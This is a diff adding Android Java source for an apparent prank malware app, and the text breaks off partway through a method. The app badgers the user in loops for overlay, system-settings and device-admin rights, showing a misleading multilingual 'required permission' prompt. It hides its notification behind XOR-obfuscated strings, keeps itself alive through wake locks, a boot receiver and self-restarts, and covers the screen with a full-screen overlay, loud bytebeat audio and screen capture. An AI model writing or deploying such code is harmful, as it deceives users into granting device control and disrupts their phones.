@@ -1,0 +1,2114 @@
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.provider.Settings;
+
+public class MainActivity extends Activity {
+
+    private Handler handler = new Handler();
+    private boolean requested = false;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            checkOverlay();
+        } else {
+            startActivity(new Intent(MainActivity.this, D.class));
+            finish();
+        }
+    }
+
+    private void checkOverlay() {
+        if (Settings.canDrawOverlays(this)) {
+            startActivity(new Intent(MainActivity.this, D.class));
+            finish();
+            return;
+        }
+        if (!requested) {
+            requested = true;
+            Intent intent = new Intent(
+                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:" + getPackageName())
+            );
+            startActivityForResult(intent, 1234);
+        }
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkOverlay();
+            }
+        }, 500);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1234) {
+            checkOverlay();
+        }
+    }
+}
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.app.AlarmManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.pm.ServiceInfo;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.provider.Settings;
+
+public class A extends Service {
+
+    private static final byte[] l111l = {14, 29, 31, 24, 21, 20, 10, 50, 48, 56, 14, 52, 50, 41, 48, 57, 51, 52, 52, 58, 13};
+    private static final byte[] ll1l = {41, 10, 12, 10, 44, 44, 42, 37, 52, 14, 50, 54, 31, 4, 49, 49, 52, 13, 9};
+    private static final byte[] l1ll = {41, 10, 12, 10, 44, 44, 42, 37, 52, 14, 50, 63, 52, 31, 4, 53, 4, 42, 31, 4, 50, 49};
+    private static final byte[] lll1 = {33, 52, 31, 31, 4, 53, 58};
+    private static final byte[] l11l = {50, 58, 41, 45, 52, 41, 50, 58};
+
+    private Handler watchdog;
+    private Runnable watchdogRunnable;
+    private PowerManager.WakeLock wakeLock;
+    private volatile boolean restartScheduled = false;
+    private static final String PREFS = "chaos_prefs";
+    private static final String KEY_B_HEARTBEAT = "b_heartbeat";
+    private static final long B_HEARTBEAT_TIMEOUT_MS = 15000L;
+
+    private static final int ALARM_REQUEST = 4242;
+
+    private static String I11i(byte[] l) {
+        byte[] i = new byte[l.length];
+        for (int O = 0; O < l.length; O++) {
+            i[O] = (byte) (l[O] ^ 0x7F);
+        }
+        return new String(i);
+    }
+
+    @Override
+    public IBinder onBind(Intent l) {
+        return null;
+    }
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        restartScheduled = false;
+        int I = (10000 - 1);
+        if (Build.VERSION.SDK_INT >= 29) {
+            startForeground(I, I1ll1(),
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
+        } else {
+            startForeground(I, I1ll1());
+        }
+
+        enableBootReceiver();
+        acquireWakeLock();
+        requestBatteryIgnore();
+        startBService();
+
+        watchdog = new Handler(Looper.getMainLooper());
+        watchdogRunnable = new Runnable() {
+            public void run() {
+                if (!isBServiceRunning()) {
+                    startBService();
+                }
+                if (watchdog != null) {
+                    watchdog.postDelayed(this, 5000);
+                }
+            }
+        };
+        watchdog.postDelayed(watchdogRunnable, 5000);
+    }
+
+    private void enableBootReceiver() {
+        try {
+            ComponentName cn = new ComponentName(this, I.class);
+            PackageManager pm = getPackageManager();
+            int state = pm.getComponentEnabledSetting(cn);
+            if (state != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+                pm.setComponentEnabledSetting(cn,
+                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        PackageManager.DONT_KILL_APP);
+            }
+        } catch (Throwable t) {}
+    }
+
+    private void acquireWakeLock() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                if (wakeLock == null) {
+                    wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "chaos::watchdog");
+                    wakeLock.setReferenceCounted(false);
+                }
+                if (!wakeLock.isHeld()) {
+                    wakeLock.acquire(24 * 60 * 60 * 1000L);
+                }
+            }
+        } catch (Throwable t) {}
+    }
+
+    private void requestBatteryIgnore() {
+        try {
+            if (Build.VERSION.SDK_INT >= 23) {
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    i.setData(Uri.parse("package:" + getPackageName()));
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(i);
+                }
+            }
+        } catch (Throwable t) {}
+    }
+
+    private boolean isBServiceRunning() {
+        try {
+            android.content.SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
+            long last = sp.getLong(KEY_B_HEARTBEAT, 0L);
+            return (System.currentTimeMillis() - last) < B_HEARTBEAT_TIMEOUT_MS;
+        } catch (Throwable t) {}
+        return false;
+    }
+
+    private void startBService() {
+        Intent l1 = new Intent(this, B.class);
+        if (Build.VERSION.SDK_INT >= 26) {
+            try { startForegroundService(l1); } catch (Throwable t) {
+                try { startService(l1); } catch (Throwable t2) {}
+            }
+        } else {
+            try { startService(l1); } catch (Throwable t) {}
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent l, int i, int O) {
+        restartScheduled = false;
+        int I = (10000 - 1);
+        if (Build.VERSION.SDK_INT >= 29) {
+            startForeground(I, I1ll1(),
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
+        } else {
+            startForeground(I, I1ll1());
+        }
+
+        enableBootReceiver();
+        acquireWakeLock();
+        requestBatteryIgnore();
+        startBService();
+        return START_STICKY;
+    }
+
+    private Notification I1ll1() {
+        NotificationManager l = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+
+        if (Build.VERSION.SDK_INT >= 26) {
+            NotificationChannel i = new NotificationChannel(
+                    I11i(l111l),
+                    I11i(ll1l),
+                    NotificationManager.IMPORTANCE_HIGH
+            );
+            i.setDescription(I11i(l1ll));
+            i.setSound(null, null);
+            i.setVibrationPattern(null);
+            i.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+            i.setBypassDnd(true);
+            i.enableVibration(false);
+            i.enableLights(false);
+            if (l != null) {
+                l.createNotificationChannel(i);
+            }
+        }
+
+        PendingIntent O = null;
+        if (Build.VERSION.SDK_INT >= 23) {
+            O = PendingIntent.getActivity(this, 0, new Intent(), PendingIntent.FLAG_IMMUTABLE);
+        } else {
+            O = PendingIntent.getActivity(this, 0, new Intent(), 0);
+        }
+
+        Notification.Builder I;
+        if (Build.VERSION.SDK_INT >= 26) {
+            I = new Notification.Builder(this, I11i(l111l));
+        } else {
+            I = new Notification.Builder(this);
+        }
+
+        I.setContentTitle(I11i(lll1))
+                .setContentText(I11i(lll1))
+                .setSmallIcon(R.drawable.im3)
+                .setContentIntent(O)
+                .setOngoing(true)
+                .setAutoCancel(false)
+                .setPriority(Notification.PRIORITY_MAX)
+                .setVisibility(Notification.VISIBILITY_SECRET)
+                .setCategory(I11i(l11l))
+                .setShowWhen(false);
+
+        return I.build();
+    }
+
+    private void scheduleRestart() {
+        if (restartScheduled) return;
+        restartScheduled = true;
+
+        Intent restart = new Intent(this, A.class);
+        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+        if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
+
+        PendingIntent pi;
+        if (Build.VERSION.SDK_INT >= 26) {
+            pi = PendingIntent.getForegroundService(this, ALARM_REQUEST, restart, flags);
+        } else {
+            pi = PendingIntent.getService(this, ALARM_REQUEST, restart, flags);
+        }
+
+        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        if (am != null) {
+            try {
+                if (Build.VERSION.SDK_INT >= 23) {
+                    am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
+                            System.currentTimeMillis() + 1000, pi);
+                } else {
+                    am.set(AlarmManager.RTC_WAKEUP,
+                            System.currentTimeMillis() + 1000, pi);
+                }
+            } catch (Throwable t) {}
+        }
+
+        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+            public void run() {
+                try {
+                    Intent i = new Intent(A.this, A.class);
+                    if (Build.VERSION.SDK_INT >= 26) {
+                        startForegroundService(i);
+                    } else {
+                        startService(i);
+                    }
+                } catch (Throwable t) {}
+            }
+        }, 3000);
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+        scheduleRestart();
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (watchdog != null) {
+            watchdog.removeCallbacksAndMessages(null);
+        }
+        if (wakeLock != null && wakeLock.isHeld()) {
+            try { wakeLock.release(); } catch (Throwable t) {}
+        }
+        try { stopForeground(true); } catch (Throwable t) {}
+        scheduleRestart();
+    }
+}
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.os.Bundle;
+import android.os.Handler;
+
+public class E extends Activity {
+
+    private Handler handler = new Handler();
+    private boolean requested = false;
+    private DevicePolicyManager dpm;
+    private ComponentName adminComponent;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        adminComponent = new ComponentName(this, F.class);
+
+        checkAdmin();
+    }
+
+    private void checkAdmin() {
+        if (dpm.isAdminActive(adminComponent)) {
+            startActivity(new Intent(E.this, G.class));
+            finish();
+            return;
+        }
+        if (!requested) {
+            requested = true;
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                "Это нужное разрешение!\n" +
+                "This is a required permission!\n" +
+                "¡Este es un permiso necesario!\n" +
+                "Bu gerekli bir izindir!\n" +
+                "!هذا إذن مطلوب\n" +
+                "!این یک مجوز لازم است\n" +
+                "Esta é uma permissão necessária!");
+            startActivityForResult(intent, 1234);
+        }
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkAdmin();
+            }
+        }, 500);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1234) {
+            checkAdmin();
+        }
+    }
+}
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.app.admin.DeviceAdminReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+public class F extends DeviceAdminReceiver {
+
+    @Override
+    public void onEnabled(Context context, Intent intent) {
+        super.onEnabled(context, intent);
+    }
+
+    @Override
+    public void onDisabled(Context context, Intent intent) {
+        super.onDisabled(context, intent);
+    }
+
+    @Override
+    public CharSequence onDisableRequested(Context context, Intent intent) {
+        return "";
+    }
+}
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.provider.Settings;
+
+public class D extends Activity {
+
+    private Handler handler = new Handler();
+    private boolean requested = false;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            checkSettings();
+        } else {
+            startActivity(new Intent(D.this, E.class));
+            finish();
+        }
+    }
+
+    private void checkSettings() {
+        if (Settings.System.canWrite(this)) {
+            startActivity(new Intent(D.this, E.class));
+            finish();
+            return;
+        }
+        if (!requested) {
+            requested = true;
+            Intent intent = new Intent(
+                Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                Uri.parse("package:" + getPackageName())
+            );
+            startActivityForResult(intent, 1234);
+        }
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkSettings();
+            }
+        }, 500);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1234) {
+            checkSettings();
+        }
+    }
+}
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.app.NotificationManager;
+import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.graphics.Canvas;
+import android.graphics.Color;
+import android.graphics.ColorMatrix;
+import android.graphics.ColorMatrixColorFilter;
+import android.graphics.Matrix;
+import android.graphics.Paint;
+import android.graphics.PixelFormat;
+import android.graphics.PorterDuff;
+import android.graphics.Rect;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.AudioAttributes;
+import android.media.AudioFormat;
+import android.media.AudioManager;
+import android.media.AudioTrack;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.provider.Settings;
+import android.util.DisplayMetrics;
+import android.view.Display;
+import android.view.Gravity;
+import android.view.WindowManager;
+import android.widget.ImageView;
+
+import java.nio.ByteBuffer;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Random;
+
+public class B extends Service {
+
+    private WindowManager wm;
+    private Random random;
+    private int screenWidth;
+    private int screenHeight;
+    private int density;
+    private int type;
+
+    private Handler handler;
+
+    private ImageView view;
+    private Bitmap bitmap;
+    private Canvas canvas;
+    private Paint paint;
+
+    private volatile boolean finished = false;
+    private int stage = 1;
+
+    private MediaProjectionManager mpm;
+    private MediaProjection mediaProjection;
+    private VirtualDisplay virtualDisplay;
+    private ImageReader imageReader;
+    private Bitmap lastScreenshot;
+    private volatile boolean projectionReady = false;
+
+    private Bitmap im16;
+    private Bitmap im8, im9, im10, im22;
+    private float juliaAngle = 0f;
+    private float juliaWetness = 0f;
+    private long stage1Start = 0;
+    private final List<SmallIcon> smallIcons = new ArrayList<SmallIcon>();
+
+    private static class SmallIcon {
+        Bitmap bmp;
+        float x, y, vx, vy;
+        float angle, angularV;
+    }
+
+    private Bitmap bgIm21;
+    private Bitmap[] tessIcons = new Bitmap[8];
+    private final String[] tessIconNames = new String[]{"im8","im2","im3","im4","im10","im11","im16","im18"};
+    private float tessSize;
+    private float tessV = 22f;
+    private float[][] vertices;
+    private int[][] edges;
+    private float[] tessCX = new float[8];
+    private float[] tessCY = new float[8];
+    private float[] tessVX = new float[8];
+    private float[] tessVY = new float[8];
+    private float[][] anglesX = new float[8][1];
+    private float[][] anglesY = new float[8][1];
+    private float[][] anglesZ = new float[8][1];
+    private Bitmap xorBuf;
+    private int xorW, xorH;
+    private int xorT = 0;
+
+    private static class TeleportImage {
+        Bitmap bmp;
+        float x, y;
+    }
+    private final List<TeleportImage> flyingImages = new ArrayList<TeleportImage>();
+    private long stage3Start = 0;
+    private long lastImageTeleport = 0;
+
+    private static class SierpChunk {
+        int x, y, size;
+        boolean inverted;
+    }
+    private final List<SierpChunk> sierpChunks = new ArrayList<SierpChunk>();
+    private Bitmap im17;
+    private long stage4Start = 0;
+    private long lastSwapTime = 0;
+    private long lastInvertTime = 0;
+    private static final int MIN_TRI = 32;
+
+    private AudioTrack bytebeatTrack;
+    private volatile boolean bytebeatRunning = false;
+    private Thread bytebeatThread;
+
+    private Runnable loopRunnable;
+
+    private int[] stage5Src;
+    private boolean stage5Snapped = false;
+    private int stage5Frame = 0;
+    private long stage5Start = 0;
+    private final List<SmallIcon> stage5SmallIcons = new ArrayList<SmallIcon>();
+    private final List<Integer> stage5Sizes = new ArrayList<Integer>();
+    private long nextStage5Spawn = 0;
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    private void measureScreenExact() {
+        int w = 0, h = 0;
+        try {
+            Display display = wm.getDefaultDisplay();
+            if (display != null) {
+                try { DisplayMetrics dm = new DisplayMetrics(); display.getRealMetrics(dm); if (dm.widthPixels > w) w = dm.widthPixels; if (dm.heightPixels > h) h = dm.heightPixels; density = dm.densityDpi; } catch (Throwable t) {}
+                try { DisplayMetrics dm = new DisplayMetrics(); display.getMetrics(dm); if (dm.widthPixels > w) w = dm.widthPixels; if (dm.heightPixels > h) h = dm.heightPixels; density = dm.densityDpi; } catch (Throwable t) {}
+                try { android.graphics.Point p = new android.graphics.Point(); display.getRealSize(p); if (p.x > w) w = p.x; if (p.y > h) h = p.y; } catch (Throwable t) {}
+                try { android.graphics.Point p = new android.graphics.Point(); display.getSize(p); if (p.x > w) w = p.x; if (p.y > h) h = p.y; } catch (Throwable t) {}
+            }
+        } catch (Throwable t) {}
+        if (w == 0 || h == 0) {
+            try { DisplayMetrics dm = new DisplayMetrics(); wm.getDefaultDisplay().getMetrics(dm); if (dm.widthPixels > w) w = dm.widthPixels; if (dm.heightPixels > h) h = dm.heightPixels; density = dm.densityDpi; } catch (Throwable t) {}
+        }
+        screenWidth = w;
+        screenHeight = h;
+    }
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+        random = new Random();
+        handler = new Handler(Looper.getMainLooper());
+        measureScreenExact();
+        applyDeviceAdminAndSettings();
+
+        if (Build.VERSION.SDK_INT <= 19) type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
+        else if (Build.VERSION.SDK_INT <= 25) type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
+        else type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
+
+        bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
+        canvas = new Canvas(bitmap);
+        paint = new Paint(Paint.ANTI_ALIAS_FLAG);
+
+        view = new ImageView(this);
+        view.setScaleType(ImageView.ScaleType.FIT_XY);
+        view.setImageBitmap(bitmap);
+
+        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                screenWidth, screenHeight, type,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                PixelFormat.TRANSLUCENT);
+        params.gravity = Gravity.TOP | Gravity.LEFT;
+        try { wm.addView(view, params); } catch (Exception e) {}
+
+        int id16 = getResources().getIdentifier("im16","drawable",getPackageName());
+        if (id16 != 0) im16 = BitmapFactory.decodeResource(getResources(), id16);
+        int id8 = getResources().getIdentifier("im8","drawable",getPackageName());
+        if (id8 != 0) im8 = BitmapFactory.decodeResource(getResources(), id8);
+        int id9 = getResources().getIdentifier("im9","drawable",getPackageName());
+        if (id9 != 0) im9 = BitmapFactory.decodeResource(getResources(), id9);
+        int id10 = getResources().getIdentifier("im10","drawable",getPackageName());
+        if (id10 != 0) im10 = BitmapFactory.decodeResource(getResources(), id10);
+        int id17 = getResources().getIdentifier("im17","drawable",getPackageName());
+        if (id17 != 0) im17 = BitmapFactory.decodeResource(getResources(), id17);
+        int id22 = getResources().getIdentifier("im22","drawable",getPackageName());
+        if (id22 != 0) im22 = BitmapFactory.decodeResource(getResources(), id22);
+
+        mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+
+        startHeartbeat();
+
+        startStage1();
+
+        loopRunnable = new Runnable() {
+            @Override public void run() {
+                if (finished) return;
+                draw();
+                handler.postDelayed(this, 16);
+            }
+        };
+        handler.post(loopRunnable);
+    }
+
+    private void startHeartbeat() {
+        final android.content.SharedPreferences sp = getSharedPreferences("chaos_prefs", MODE_PRIVATE);
+        Runnable r = new Runnable() {
+            @Override
+            public void run() {
+                if (finished) return;
+                try {
+                    sp.edit().putLong("b_heartbeat", System.currentTimeMillis()).apply();
+                } catch (Throwable t) {}
+                handler.postDelayed(this, 5000);
+            }
+        };
+        handler.post(r);
+    }
+
+    private void startStage1() {
+        stage = 1;
+        stage1Start = System.currentTimeMillis();
+        juliaAngle = 0f;
+        juliaWetness = 0f;
+        smallIcons.clear();
+        for (int i = 0; i < 30; i++) {
+            SmallIcon si = new SmallIcon();
+            si.bmp = (random.nextBoolean() ? im8 : im9);
+            si.x = screenWidth / 2f;
+            si.y = screenHeight / 2f;
+            float a = random.nextFloat() * (float)(Math.PI * 2);
+            float speed = 8f + random.nextFloat() * 20f;
+            si.vx = (float) Math.cos(a) * speed;
+            si.vy = (float) Math.sin(a) * speed;
+            si.angle = random.nextFloat() * 360f;
+            si.angularV = (random.nextFloat() - 0.5f) * 30f;
+            smallIcons.add(si);
+        }
+        startBytebeat(1, 8000, 10000);
+        handler.postDelayed(new Runnable() {
+            @Override public void run() {
+                if (finished) return;
+                stopBytebeat();
+                startStage2();
+            }
+        }, 10000);
+    }
+
+    private void startStage2() {
+        stage = 2;
+        smallIcons.clear();
+        if (im16 != null) { im16.recycle(); im16 = null; }
+        if (im8 != null) { im8.recycle(); im8 = null; }
+        if (im9 != null) { im9.recycle(); im9 = null; }
+
+        int im21 = getResources().getIdentifier("im21","drawable",getPackageName());
+        if (im21 != 0) {
+            Bitmap tmp = BitmapFactory.decodeResource(getResources(), im21);
+            if (tmp != null) {
+                bgIm21 = Bitmap.createScaledBitmap(tmp, screenWidth, screenHeight, true);
+                if (bgIm21 != tmp) tmp.recycle();
+            }
+        }
+        xorW = screenWidth / 3;
+        xorH = screenHeight / 3;
+        xorBuf = Bitmap.createBitmap(xorW, xorH, Bitmap.Config.ARGB_8888);
+        xorT = 0;
+
+        for (int i = 0; i < 8; i++) {
+            int id = getResources().getIdentifier(tessIconNames[i], "drawable", getPackageName());
+            if (id != 0) {
+                Bitmap b = BitmapFactory.decodeResource(getResources(), id);
+                if (b != null) {
+                    tessIcons[i] = Bitmap.createScaledBitmap(b, 24, 24, true);
+                    if (tessIcons[i] != b) b.recycle();
+                }
+            }
+        }
+
+        tessSize = (screenWidth + screenHeight) / 7f;
+        float d = 60f;
+        float s = tessSize;
+        vertices = new float[][]{
+                {s,0,0},{s,s,0},{0,s,0},{0,0,0},
+                {s,0,s},{s,s,s},{0,s,s},{0,0,s},
+                {s-d,d,d},{s-d,s-d,d},{d,s-d,d},{d,d,d},
+                {s-d,d,s-d},{s-d,s-d,s-d},{d,s-d,s-d},{d,d,s-d}
+        };
+        edges = new int[][]{
+                {0,1},{1,2},{2,3},{3,0},{0,4},{1,5},{2,6},{3,7},
+                {4,5},{5,6},{6,7},{7,4},{8,9},{9,10},{10,11},{11,8},
+                {8,12},{9,13},{10,14},{11,15},{12,13},{13,14},{14,15},{15,12},
+                {0,8},{1,9},{2,10},{3,11},{4,12},{5,13},{6,14},{7,15}
+        };
+        for (int i = 0; i < 8; i++) {
+            tessCX[i] = tessSize + random.nextFloat() * Math.max(1f, screenWidth - 2*tessSize);
+            tessCY[i] = tessSize + random.nextFloat() * Math.max(1f, screenHeight - 2*tessSize);
+            tessVX[i] = (random.nextBoolean()?1:-1) * tessV;
+            tessVY[i] = (random.nextBoolean()?1:-1) * tessV;
+            anglesX[i][0] = 0.01f + random.nextFloat() * 0.03f;
+            anglesY[i][0] = 0.01f + random.nextFloat() * 0.03f;
+            anglesZ[i][0] = 0.01f + random.nextFloat() * 0.03f;
+        }
+
+        startBytebeat(2, 16000, 10000);
+        handler.postDelayed(new Runnable() {
+            @Override public void run() {
+                if (finished) return;
+                stopBytebeat();
+                startStage3();
+            }
+        }, 10000);
+    }
+
+    private void startStage3() {
+        stage = 3;
+        if (bgIm21 != null) { bgIm21.recycle(); bgIm21 = null; }
+        for (int i = 0; i < 8; i++) { if (tessIcons[i] != null) { tessIcons[i].recycle(); tessIcons[i] = null; } }
+        if (xorBuf != null) { xorBuf.recycle(); xorBuf = null; }
+
+        int imgId = getResources().getIdentifier("im18","drawable",getPackageName());
+        Bitmap imageBmp = null;
+        if (imgId != 0) imageBmp = BitmapFactory.decodeResource(getResources(), imgId);
+
+        flyingImages.clear();
+        for (int i = 0; i < 5 && imageBmp != null; i++) {
+            TeleportImage fi = new TeleportImage();
+            fi.bmp = imageBmp;
+            fi.x = random.nextInt(screenWidth);
+            fi.y = random.nextInt(screenHeight);
+            flyingImages.add(fi);
+        }
+
+        lastImageTeleport = 0;
+
+        startBytebeat(3, 44100, 23066);
+        handler.postDelayed(new Runnable() {
+            @Override public void run() {
+                if (finished) return;
+                stopBytebeat();
+                startStage4();
+            }
+        }, 23066);
+
+        stage3Start = System.currentTimeMillis();
+    }
+
+    private void startStage4() {
+        stage = 4;
+
+        flyingImages.clear();
+
+        startProjection();
+
+        sierpChunks.clear();
+        buildSierpinski(0, 0, screenWidth, screenHeight, 0);
+
+        lastSwapTime = 0;
+        lastInvertTime = 0;
+
+        startBytebeat(4, 8000, 15000);
+        handler.postDelayed(new Runnable() {
+            @Override public void run() {
+                if (finished) return;
+                stopBytebeat();
+                startStage5();
+            }
+        }, 15000);
+
+        stage4Start = System.currentTimeMillis();
+    }
+
+    private void buildSierpinski(int x, int y, int w, int h, int depth) {
+        if (w < MIN_TRI || h < MIN_TRI || depth > 8) {
+            SierpChunk c = new SierpChunk();
+            c.x = x;
+            c.y = y;
+            c.size = Math.min(w, h);
+            c.inverted = false;
+            sierpChunks.add(c);
+            return;
+        }
+        int halfW = w / 2;
+        int halfH = h / 2;
+        buildSierpinski(x, y, halfW, halfH, depth + 1);
+        buildSierpinski(x + halfW, y, w - halfW, halfH, depth + 1);
+        buildSierpinski(x, y + halfH, halfW, h - halfH, depth + 1);
+    }
+
+    private void startProjection() {
+        if (mediaProjection != null) return;
+        android.content.SharedPreferences sp = getSharedPreferences("chaos_prefs", MODE_PRIVATE);
+        int savedCode = sp.getInt("mp_result_code", -100);
+        String savedUri = sp.getString("mp_intent_uri", null);
+        if (savedCode == -100 || savedUri == null) return;
+        Intent savedIntent = null;
+        try {
+            savedIntent = Intent.parseUri(savedUri, Intent.URI_INTENT_SCHEME);
+        } catch (java.net.URISyntaxException e) {
+            return;
+        }
+        if (savedIntent == null) return;
+        try {
+            mediaProjection = mpm.getMediaProjection(savedCode, savedIntent);
+            if (mediaProjection == null) return;
+            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
+            virtualDisplay = mediaProjection.createVirtualDisplay(
+                    "SierpCapture",
+                    screenWidth, screenHeight, density,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.getSurface(), null, handler);
+            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
+                @Override public void onImageAvailable(ImageReader reader) {
+                    Image image = null;
+                    try {
+                        image = reader.acquireLatestImage();
+                        if (image == null) return;
+                        Image.Plane[] planes = image.getPlanes();
+                        ByteBuffer buffer = planes[0].getBuffer();
+                        int pixelStride = planes[0].getPixelStride();
+                        int rowStride = planes[0].getRowStride();
+                        int rowPadding = rowStride - pixelStride * screenWidth;
+                        int bmpW = screenWidth + rowPadding / pixelStride;
+                        Bitmap bmp = Bitmap.createBitmap(bmpW, screenHeight, Bitmap.Config.ARGB_8888);
+                        bmp.copyPixelsFromBuffer(buffer);
+                        if (bmpW != screenWidth) {
+                            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, screenWidth, screenHeight);
+                            bmp.recycle(); bmp = cropped;
+                        }
+                        if (lastScreenshot != null) lastScreenshot.recycle();
+                        lastScreenshot = bmp;
+                        projectionReady = true;
+                    } catch (Exception e) {
+                    } finally { if (image != null) image.close(); }
+                }
+            }, handler);
+        } catch (Exception e) {}
+    }
+
+    // ===== СТАДИЯ 5 =====
+    private void startStage5() {
+        stage = 5;
+        stage5Start = System.currentTimeMillis();
+        stage5Frame = 0;
+        stage5Snapped = false;
+        stage5Src = null;
+        stage5SmallIcons.clear();
+        stage5Sizes.clear();
+        nextStage5Spawn = 0;
+        startBytebeat(5, 8000, 26146);
+        handler.postDelayed(new Runnable() {
+            @Override public void run() {
+                if (finished) return;
+                stopBytebeat();
+                fullShutdown();
+            }
+        }, 26146);
+    }
+
+    private void fullShutdown() {
+        try {
+            ComponentName cn = new ComponentName(this, I.class);
+            PackageManager pm = getPackageManager();
+            pm.setComponentEnabledSetting(cn,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        } catch (Throwable t) {}
+
+        try {
+            Intent intentA = new Intent(this, A.class);
+            stopService(intentA);
+        } catch (Throwable t) {}
+
+        cleanup();
+        stopSelf();
+    }
+
+    private void drawStage5() {
+        long elapsed = System.currentTimeMillis() - stage5Start;
+        if (!stage5Snapped && projectionReady && lastScreenshot != null) {
+            try {
